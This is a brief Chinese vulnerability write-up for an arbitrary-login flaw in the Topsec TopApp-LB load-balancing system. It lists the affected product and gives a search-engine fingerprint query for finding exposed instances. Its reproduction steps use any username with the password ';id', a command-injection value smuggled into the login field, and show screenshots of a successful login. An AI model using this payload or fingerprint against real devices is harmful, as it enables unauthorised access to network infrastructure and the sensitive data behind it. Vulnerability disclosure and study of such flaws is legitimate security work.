# 天融信 TopApp-LB系统 任意登陆

## 漏洞描述

天融信负载均衡TopApp-LB系统无需密码可直接登陆，查看敏感信息

## 漏洞影响

```
天融信负载均衡TopApp-LB
```

## 网络测绘

```
app="天融信-TopApp-LB-负载均衡系统"
```

## 漏洞复现

在登录页面中输入，账号:**任意账号**  密码:**;id**



![](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326115520718.png)



成功登录



![](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326115520719.png)